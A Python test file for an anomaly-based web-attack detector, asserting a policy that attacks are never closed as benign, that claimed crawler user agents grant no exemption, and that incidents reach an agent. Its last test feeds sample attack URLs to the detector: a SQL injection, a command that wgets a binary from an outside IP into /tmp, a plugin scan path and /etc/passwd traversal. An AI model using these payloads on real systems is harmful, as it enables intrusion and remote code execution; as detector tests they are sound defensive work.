"""Tests for the zero-false-negative policy.

An attack classified as benign is the error this system must not make; a false
positive only creates triage work, which the agents do. The consequences are
structural and are locked down here:

  * the deterministic path issues no benign verdict at any score;
  * a crawler user agent is an annotation, never an exemption — the field is the
    client's;
  * a batch without an incident states how close the traffic came to the floor;
  * an incident that got no agent is declared, not silenced;
  * an event below the floor still reaches the agent when a sibling in its window
    rose above it.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from app.orchestrator import crawler_claim, deterministic_verdict
from app.pipeline.correlator import correlate
from app.pipeline.detector import Detector
from app.schemas import AnalyzeRequest
from tests.conftest import SQLI_URL, StubDetector, make_event
from tests.test_orchestrator import as_payload, build

MODEL_PATH = Path("models/detector.joblib")


class TestNeverClosesAsBenign:
    @pytest.mark.parametrize("score", [0.50, 0.55, 0.60, 0.70, 0.85, 0.99])
    def test_no_score_produces_a_benign_verdict(self, attack_dossier, score):
        attack_dossier.suspicious = attack_dossier.suspicious[:1]
        attack_dossier.suspicious[0].score = score
        verdict = deterministic_verdict(attack_dossier, StubDetector().severity)
        assert verdict["verdict"] == "suspicious"
        assert verdict["recommended_action"] != "allow"

    def test_without_a_severity_function_it_uses_the_most_conservative_grade(
        self, attack_dossier
    ):
        """A missing calibration must not turn into clearance by omission."""
        verdict = deterministic_verdict(attack_dossier)
        assert verdict["severity"] == "low"
        assert verdict["recommended_action"] == "monitor"

    def test_confidence_is_capped_because_the_distributions_overlap(
        self, attack_dossier
    ):
        attack_dossier.suspicious[0].score = 0.99
        verdict = deterministic_verdict(attack_dossier, StubDetector().severity)
        assert verdict["confidence"] <= 0.6


class TestCrawlerDoesNotExempt:
    def test_a_crawler_user_agent_does_not_clear_the_incident(self, attack_dossier):
        """A real bypass in the previous version: `User-Agent: Googlebot` plus payload.

        The user agent is chosen by the client. Verifying a crawler requires reverse
        and forward DNS on the IP, which this system does not do — so the string
        cannot lower the classification.
        """
        for event in attack_dossier.events:
            event.user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1)"
        verdict = deterministic_verdict(attack_dossier, StubDetector().severity)
        assert verdict["verdict"] == "suspicious"
        assert verdict["recommended_action"] != "allow"

    def test_the_crawler_claim_is_recorded_for_the_agent(self, attack_dossier):
        for event in attack_dossier.events:
            event.user_agent = "Mozilla/5.0 (compatible; MJ12bot/v1.4.8)"
        verdict = deterministic_verdict(attack_dossier, StubDetector().severity)
        assert "mj12bot" in verdict["summary"].lower()
        assert "was not verified" in verdict["summary"]

    def test_without_a_crawler_there_is_no_claim(self, attack_dossier):
        assert crawler_claim(attack_dossier) == ""


class TestBatchWithoutIncident:
    def test_reports_how_many_landed_near_the_floor(self, database, settings):
        events = [make_event(url="/product/nearmiss", offset=i) for i in range(3)]
        request = AnalyzeRequest(events=[as_payload(e) for e in events])
        response, _ = build(database, settings).analyze(request)

        assert response.incidents == []
        assert response.events_near_threshold == 3
        assert response.recommended_action == "monitor"
        assert "escalation floor" in response.message

    def test_a_genuinely_clean_batch_may_allow(self, database, settings):
        """True negatives exist and are legitimate: 99.8% of traffic is one."""
        events = [make_event(url=f"/product/{i}", offset=i) for i in range(5)]
        request = AnalyzeRequest(events=[as_payload(e) for e in events])
        response, _ = build(database, settings).analyze(request)

        assert response.events_near_threshold == 0
        assert response.recommended_action == "allow"
        assert response.threat_detected is False


class TestIncidentWithoutAgentIsDeclared:
    def test_without_an_llm_every_incident_awaits_an_agent(
        self, database, settings, attack_events
    ):
        request = AnalyzeRequest(events=[as_payload(e) for e in attack_events])
        response, _ = build(database, settings).analyze(request)

        assert response.incidents_awaiting_agent == len(response.incidents)
        assert all(r.analyzed_by == "deterministic" for r in response.incidents)
        assert all(r.verdict != "benign" for r in response.incidents)

    def test_deadline_pending_incidents_count_too(self, database, settings):
        events = [
            make_event(url=SQLI_URL, ip=f"10.0.0.{octet}") for octet in range(1, 5)
        ]
        request = AnalyzeRequest(events=[as_payload(e) for e in events])
        response, pending = build(database, settings).analyze(request, deadline_seconds=0)
        assert response.incidents_awaiting_agent == len(response.incidents) + len(pending)


class TestIncidentRecall:
    def test_event_below_the_floor_reaches_the_agent_through_its_sibling(self):
        """The metric that matters is the window, not the event.

        The dossier carries the IP's whole window, so an event that did not pass the
        floor is still read by the agent when another from the same IP did. That is why
        the measured incident recall (0.9972) exceeds the event recall (0.9883).
        """
        detector = StubDetector()
        events = [
            make_event(url="/product/nearmiss", ip="10.0.0.9", offset=0),
            make_event(url=SQLI_URL, ip="10.0.0.9", offset=10),
        ]
        scores = detector.score_events(events)
        assert scores[0] < detector.event_threshold

        dossier = correlate(events, scores, detector.event_threshold)[0]
        assert dossier.suspicious_count == 1
        assert dossier.event_count == 2
        # The event that escaped shows up in the prompt the agent reads.
        assert "/product/nearmiss" in dossier.to_prompt()

    def test_a_window_with_no_suspect_produces_no_dossier(self):
        """The only point in the system where traffic stops being examined."""
        detector = StubDetector()
        events = [make_event(url="/product/nearmiss", offset=i) for i in range(3)]
        scores = detector.score_events(events)
        assert correlate(events, scores, detector.event_threshold) == []


@pytest.mark.skipif(not MODEL_PATH.exists(), reason="artifact missing")
class TestDefaultOperatingPoint:
    def test_the_default_is_recall_first(self):
        from app.config import Settings

        assert Settings().novelty_target_fpr == 0.002

    def test_attacks_from_every_family_pass_the_floor(self):
        """One sample per family, all zero-shot — none entered the fit."""
        detector = Detector(MODEL_PATH, target_fpr=0.002)
        samples = {
            "sqli": "/image/1?wh=50x50' UNION ALL SELECT NULL,NULL,NULL-- aBcD",
            "rce": "/index.php?cmd=wget http://217.61.5.226/bins/Solstice.mips -O - > /tmp/.x",
            "scanning": "/wp-content/plugins/wp-easy-gallery-pro/admin/php.php",
            "traversal": "/index.php?file=../../../../etc/passwd",
        }
        for family, url in samples.items():
            score = detector.score_events([make_event(url=url)])[0]
            assert score >= detector.event_threshold, f"{family} escaped: {score:.4f}"
